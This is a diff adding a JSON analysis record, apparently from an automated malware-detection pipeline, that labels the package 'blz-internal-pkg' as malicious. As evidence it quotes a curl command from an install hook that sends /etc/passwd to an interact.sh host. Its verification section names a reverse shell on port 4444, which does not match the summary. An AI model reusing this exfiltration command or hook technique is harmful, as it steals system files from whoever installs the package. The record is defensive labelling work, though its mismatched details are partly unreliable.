@@ -1,0 +1,54 @@
+{
+  "package_name": "blz-internal-pkg",
+  "version": "2.0.0",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 1,
+    "risk_vector": [
+      "data_exfiltration"
+    ],
+    "behaviors": [
+      {
+        "category": "data_exfiltration",
+        "summary": "The package contains a pre-install hook that sends the content of /etc/passwd file to a remote server.",
+        "details": "The pre-install hook contains a curl command that sends the content of /etc/passwd file to a remote server identified by a URL in the hook command.",
+        "confidence": 0.97,
+        "evidence_commands": [
+          "/usr/bin/curl--data'@/etc/passwd'$(hostname).c76vh7298mig6so43dmgc8g9t8oyyyyyn.interact.sh"
+        ],
+        "evidence_files": [],
+        "evidence_apis": [],
+        "evidence_domains": [],
+        "evidence_env_vars": []
+      }
+    ],
+    "analyst_note": ""
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "chain_narrative": "The package contains a pre-install hook that sends the content of /etc/passwd file to a remote server identified by a URL in the hook command. The attacker may be trying to exfiltrate sensitive data.",
+      "attack_vector": [
+        "postinstallhook",
+        "bash-c",
+        "34.x.x.x:4444",
+        "reverseshell"
+      ],
+      "chain_score": 0.7,
+      "verdict": "MALICIOUS",
+      "confidence": 0.97
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": "Package has no description or README, and the behavior is clearly anomalous."
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "flag",
+    "structural_risk_score": 0.9693,
+    "confirmed_signals_count": 2,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T13:12:06.051487"
+}
